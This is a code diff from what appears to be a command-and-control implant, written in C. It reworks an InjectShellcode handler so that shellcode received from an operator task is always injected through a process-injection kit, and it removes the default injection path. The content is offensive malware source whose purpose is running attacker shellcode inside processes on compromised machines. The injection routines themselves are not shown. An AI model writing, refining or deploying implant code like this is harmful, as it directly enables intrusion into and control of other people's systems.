@@ -20,7 +20,6 @@
  */
 VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
 {
-    BOOL   isProcessInjectKit     = FALSE;
     PBYTE  Shellcode              = NULL;
     PCHAR  injectKitBof           = NULL;
     SIZE_T scLength               = 0;
@@ -32,11 +31,11 @@ VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     UINT32 nbArg = ParserGetInt32(arguments);
     _dbg("GOT %d arguments", nbArg);
 
-    if ( nbArg > 1 )
+    if ( nbArg <= 1 )
     {
-        isProcessInjectKit = TRUE;
+        // Wrong # of args
+        return;
     }
-    
     
     /* Get shellcode bytes */
     PCHAR shellcodeData = ParserGetString(arguments, &scLength);
@@ -53,34 +52,18 @@ VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     _dbg("Received shellcode - %d bytes", scLength);
 
     /* Parse process injection kit if enabled */
-    if ( isProcessInjectKit ) 
-    {
-        injectKitBof = ParserGetString(arguments, &kitLen);
-        injectKitBof += 8;  // Skip 8 bytes (typed array header)
-        kitLen       -= 8;
-        _dbg("[+] Using Custom Process Injection Kit. %d bytes", kitLen);
-    }
+    injectKitBof = ParserGetString(arguments, &kitLen);
+    injectKitBof += 8;  // Skip 8 bytes (typed array header)
+    kitLen       -= 8;
+    _dbg("[+] Using Process Injection Kit. %d bytes", kitLen);
 
     /* Inject shellcode ( default | custom kit ) */
-    if ( isProcessInjectKit ) 
+    if ( !InjectShellcodeViaKit(Shellcode, scLength, injectKitBof, kitLen, &Output, &OutLen) )
     {
-        if ( !InjectCustomKit(Shellcode, scLength, injectKitBof, kitLen, &Output, &OutLen) ) 
-        {
-            DWORD error = GetLastError();
-            _err("[!] Failed to inject with kit. ERROR : %d\n", error);
-            PackageError(taskUuid, error);
-            return;
-        }
-    }
-    else 
-    {
-        if ( !InjectDefault(Shellcode, scLength, &Output, &OutLen) ) 
-        {
-            DWORD error = GetLastError();
-            _err("[!] Failed to inject with default method. ERROR : %d\n", error);
-            PackageError(taskUuid, error);
-            return;
-        }
+        DWORD error = GetLastError();
+        _err("[!] Failed to inject with kit. ERROR : %d\n", error);
+        PackageError(taskUuid, error);
+        return;
     }
 
     _dbg("[+] Done injecting.");
